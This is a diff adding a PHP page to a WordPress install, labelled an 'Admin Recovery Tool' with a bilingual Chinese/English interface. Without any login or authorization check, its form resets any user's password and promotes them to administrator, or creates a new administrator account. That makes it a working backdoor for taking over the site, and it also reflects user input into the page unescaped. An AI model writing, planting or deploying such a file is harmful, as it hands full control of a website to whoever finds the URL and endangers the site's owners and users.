@@ -1,0 +1,296 @@
+<?php
+
+ini_set('display_errors', 0);
+error_reporting(E_ALL);
+
+$message = '';
+$msg_type = '';
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action_admin'])) {
+
+    // Load WordPress Environment
+    if (file_exists(dirname(__FILE__) . '/wp-blog-header.php')) {
+        require_once(dirname(__FILE__) . '/wp-blog-header.php');
+        require_once(ABSPATH . 'wp-includes/registration.php');
+        require_once(ABSPATH . 'wp-includes/pluggable.php');
+        require_once(ABSPATH . 'wp-includes/user.php');
+    } else {
+        $message = "Error: 找不到 wp-blog-header.php 文件 (File wp-blog-header.php not found).";
+        $msg_type = 'error';
+    }
+
+    if (empty($message)) {
+        // take input
+        $target_user = sanitize_text_field($_POST['username']);
+        $new_pass    = $_POST['password'];
+        $target_email= sanitize_email($_POST['email']);
+
+        if (empty($target_user) || empty($new_pass)) {
+            $message = "错误：用户名和密码不能为空。<br>Error: Username and Password are required.";
+            $msg_type = 'error';
+        } else {
+            // Check User
+            $user = get_user_by('login', $target_user);
+
+            // SKENARIO 1: UPDATE / RESET
+            if ($user) {
+                wp_set_password($new_pass, $user->ID);
+                $u_obj = new WP_User($user->ID);
+                $u_obj->set_role('administrator');
+
+                $message = "<strong>成功 (Success)!</strong><br>用户 '{$target_user}' 已存在。密码已重置，权限已设为管理员。<br>User exists. Password reset & Role set to Administrator.";
+                $msg_type = 'success';
+            } 
+            // SKENARIO 2: CREATE NEW
+            else {
+                if (empty($target_email)) {
+                    $message = "错误：创建新用户需要邮箱地址。<br>Error: Email is required for new user.";
+                    $msg_type = 'error';
+                } elseif (email_exists($target_email)) {
+                    $message = "错误：该邮箱 '{$target_email}' 已被使用。<br>Error: Email already in use.";
+                    $msg_type = 'error';
+                } else {
+                    $user_id = wp_create_user($target_user, $new_pass, $target_email);
+                    if (is_int($user_id)) {
+                        $u_obj = new WP_User($user_id);
+                        $u_obj->set_role('administrator');
+                        $message = "<strong>成功 (Success)!</strong><br>新管理员用户 '{$target_user}' 已创建。<br>New Admin user created.";
+                        $msg_type = 'success';
+                    } else {
+                        $message = "系统错误 (System Error).";
+                        $msg_type = 'error';
+                    }
+                }
+            }
+        }
+    }
+}
+?>
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WP Admin Tool</title>
+    <style>
+        body {
+            font-family: "Microsoft YaHei", "Heiti SC", -apple-system, BlinkMacSystemFont, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: #fff;
+            padding: 2.5rem;
+            border-radius: 10px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
+            width: 100%;
+            max-width: 420px;
+            position: relative;
+        }
+        .lang-switch {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+        }
+        .lang-btn {
+            background: none;
+            border: 1px solid #ddd;
+            padding: 5px 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 12px;
+            color: #666;
+        }
+        .lang-btn:hover {
+            background: #f0f0f1;
+            color: #2271b1;
+        }
+        h2 {
+            margin-top: 0;
+            color: #1d2327;
+            text-align: center;
+            font-size: 24px;
+            margin-bottom: 25px;
+        }
+        .form-group {
+            margin-bottom: 18px;
+        }
+        label {
+            display: block;
+            margin-bottom: 6px;
+            font-weight: 600;
+            color: #50575e;
+            font-size: 14px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #dcdcde;
+            border-radius: 5px;
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: border-color 0.2s;
+        }
+        input:focus {
+            border-color: #2271b1;
+            outline: none;
+            box-shadow: 0 0 0 1px #2271b1;
+        }
+        button.submit-btn {
+            width: 100%;
+            padding: 14px;
+            background-color: #2271b1;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button.submit-btn:hover {
+            background-color: #135e96;
+        }
+        .alert {
+            padding: 15px;
+            margin-bottom: 20px;
+            border-radius: 5px;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+        .alert-success {
+            background-color: #edfaef;
+            color: #005a00;
+            border: 1px solid #c3e6cb;
+        }
+        .alert-error {
+            background-color: #fde8e8;
+            color: #9b1c1c;
+            border: 1px solid #f8b4b4;
+        }
+        .note {
+            margin-top: 25px;
+            font-size: 12px;
+            color: #8c8f94;
+            text-align: center;
+            border-top: 1px solid #eee;
+            padding-top: 15px;
+        }
+        .login-btn {
+            display: block;
+            text-align: center;
+            background: #007017;
+            color: white;
+            padding: 12px;
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="lang-switch">
+        <button type="button" class="lang-btn" onclick="toggleLanguage()" id="btn-lang">English</button>
+    </div>
+
+    <h2 id="txt-title">wordpress by PTSMC-Group</h2>
+
+    <?php if (!empty($message)): ?>
+        <div class="alert alert-<?php echo $msg_type; ?>">
+            <?php echo $message; ?>
+        </div>
+        <?php if ($msg_type === 'success'): ?>
+            <a href="wp-login.php" target="_blank" class="login-btn" id="txt-login">登录后台 (Login)</a>
+        <?php endif; ?>
+    <?php endif; ?>
+
+    <?php if ($msg_type !== 'success'): ?>
+    <form method="POST" action="">
+        <input type="hidden" name="action_admin" value="1">
+        
+        <div class="form-group">
+            <label for="username" id="lbl-user">用户名 (Username)</label>
+            <input type="text" id="username" name="username" required>
+        </div>
+
+        <div class="form-group">
+            <label for="password" id="lbl-pass">新密码 (New Password)</label>
+            <input type="text" id="password" name="password" required>
+        </div>
+
+        <div class="form-group">
+            <label for="email" id="lbl-email">电子邮箱 (Email)</label>
+            <input type="email" id="email" name="email">
+            <small style="color:#888; font-size:11px; display:block; margin-top:5px;" id="txt-email-hint">* 创建新用户时必填 (Required for new user)</small>
+        </div>
+
+        <button type="submit" class="submit-btn" id="btn-submit">执行操作 (Process)</button>
+    </form>
+    <?php endif; ?>
+
+    <div class="note" id="txt-security">
+        安全提示：为了网站安全，请在成功登录后立即删除此文件。<br>
+        Security: Please delete this file immediately after login.
+    </div>
+</div>
+
+<script>
+    // Configuration
+    let currentLang = 'cn';
+
+    // Dictionary
+    const langData = {
+        'cn': {
+            btn_switch: 'English',
+            title: 'WordPress 管理员恢复',
+            lbl_user: '用户名',
+            lbl_pass: '新密码',
+            lbl_email: '电子邮箱',
+            hint_email: '* 仅在创建新用户时必填',
+            btn_submit: '确认执行',
+            security: '安全提示：为了网站安全，请在成功登录后立即删除此文件。'
+        },
+        'en': {
+            btn_switch: '中文 (Chinese)',
+            title: 'Admin Recovery Tool',
+            lbl_user: 'Username',
+            lbl_pass: 'New Password',
+            lbl_email: 'Email Address',
+            hint_email: '* Required only if creating a new user',
+            btn_submit: 'Process Request',
+            security: 'Security Warning: Please delete this file immediately after successful login.'
+        }
+    };
+
+    function toggleLanguage() {
+        // Flip status
+        currentLang = (currentLang === 'cn') ? 'en' : 'cn';
+        const data = langData[currentLang];
+
+        // Update DOM
+        document.getElementById('btn-lang').innerText = data.btn_switch;
+        document.getElementById('txt-title').innerText = data.title;
+        
+        // Check if elements exist (form might be hidden on success)
+        if(document.getElementById('lbl-user')) {
+            document.getElementById('lbl-user').innerText = data.lbl_user;
+            document.getElementById('lbl-pass').innerText = data.lbl_pass;
+            document.getElementById('lbl-email').innerText = data.lbl_email;
+            document.getElementById('txt-email-hint').innerText = data.hint_email;
+            document.getElementById('btn-submit').innerText = data.btn_submit;
+        }
+        
+        document.getElementById('txt-security').innerText = data.security;
+    }
+</script>
+
+</body>
+</html>
